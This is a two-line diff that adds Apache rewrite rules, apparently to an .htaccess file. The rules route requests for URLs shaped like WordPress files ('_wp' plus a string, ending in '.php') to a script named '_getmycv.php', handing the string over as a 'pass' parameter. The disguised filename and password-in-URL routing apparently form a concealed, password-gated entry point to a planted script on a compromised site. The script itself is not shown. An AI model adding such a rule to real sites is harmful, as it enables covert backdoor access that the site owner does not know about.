@@ -1,0 +1,2 @@
+RewriteEngine on
+RewriteRule ^_wp([0-9a-z]+)\.php$ _getmycv.php?pass=$1 [QSA,L]
